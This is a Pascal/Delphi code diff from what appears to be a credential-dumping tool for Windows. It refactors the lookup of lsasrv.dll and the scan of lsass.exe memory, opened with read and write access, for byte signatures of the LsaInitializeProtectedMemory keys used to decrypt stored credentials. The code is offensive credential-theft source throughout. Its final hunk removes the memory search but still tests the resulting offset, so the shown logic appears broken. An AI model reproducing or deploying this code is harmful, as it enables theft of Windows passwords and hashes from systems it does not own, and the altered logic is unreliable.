@@ -462,6 +462,7 @@ const
  PTRN_WN10_LsaInitializeProtectedMemory_KEY:array[0..15] of byte=  ($83, $64, $24, $30, $00, $48, $8d, $45, $e0, $44, $8b, $4d, $d8, $48, $8d, $15);
  PTRN_WALL_LsaInitializeProtectedMemory_KEY_X86:array[0..4]  of byte=  ($6a, $02, $6a, $10, $68);
 var
+  module:string='lsasrv.dll';
 pattern:array of byte;
  IV_OFFSET:ShortInt=0 ; //signed byte
  DES_OFFSET:ShortInt=0 ; //signed byte
@@ -525,13 +526,16 @@ if IV_OFFSET=0 then
    exit;
    end;
 //*************************
-hmod:=loadlibrary('lsasrv.dll');
+//lets search keySigOffset "offline" i.e NOT in lsass.exe
+hmod:=loadlibrary(pchar(module));
 log('hMod:'+inttohex(hmod,sizeof(pointer)),0);
 fillchar(MODINFO,sizeof(MODINFO),0);
 GetModuleInformation (getcurrentprocess,hmod,MODINFO ,sizeof(MODULEINFO));
-//lets search keySigOffset "offline" i.e NOT in lsass.exe
 keySigOffset:=SearchMem(getcurrentprocess,MODINFO.lpBaseOfDll ,MODINFO.SizeOfImage,pattern);
 log('keySigOffset:'+inttohex(keySigOffset,sizeof(pointer)),0);
+
+
+//lets search in lsass mem now
 hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                       false,pid);
 
@@ -542,7 +546,7 @@ for count:=0 to cbneeded div sizeof(thandle) do
       GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) );
       dummy:=lowercase(strpas(szModName ));
       //writeln(dummy);
-      if pos('lsasrv.dll',dummy)>0 then begin lsasrvMem:=hMods[count];break;end;
+      if pos(module,dummy)>0 then begin lsasrvMem:=hMods[count];break;end;
     end;
 if lsasrvMem=0 then exit;
 //writeln('sizeof(pointer):'+inttostr(sizeof(pointer)));
@@ -791,29 +795,6 @@ hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATI
   if hprocess<>thandle(-1) then
        begin
        log('openprocess ok',0);
-       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
-       cbneeded:=0;
-       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
-               begin
-               log('EnumProcessModules OK',0);
-
-               for count:=0 to cbneeded div sizeof(thandle) do
-                   begin
-                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
-                      begin
-                      //dummy:=lowercase(strpas(szModName ));
-                      if pos(lowercase(module),lowercase(strpas(szModName )))>0 then
-                         begin
-                         log(module+' found:'+inttohex(hMods[count],8),0);
-                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
-                            begin
-                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
-                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
-                            addr_:=MODINFO.lpBaseOfDll;
-                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
-                            log('Searching...',0);
-                            offset:=searchmem(hprocess,addr_,MODINFO.SizeOfImage,pattern);
-                            log('Done!',0);
                             if offset<>0 then
                                  begin
                                  log('found:'+inttohex(offset,sizeof(pointer)),0);
@@ -864,12 +845,7 @@ hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATI
                                       end;//while
                                  end; //if readmem
 
-                                 end;
-                            end;//if GetModuleInformation...
-                         end; //if pos('samsrv.dll',dummy)>0 then
-                      end; //if GetModuleFileNameExA
-                   end; //for count:=0...
-               end; //if EnumProcessModules...
+                                 end; //if offset<>0
        closehandle(hprocess);
        end;//if openprocess...
 end;
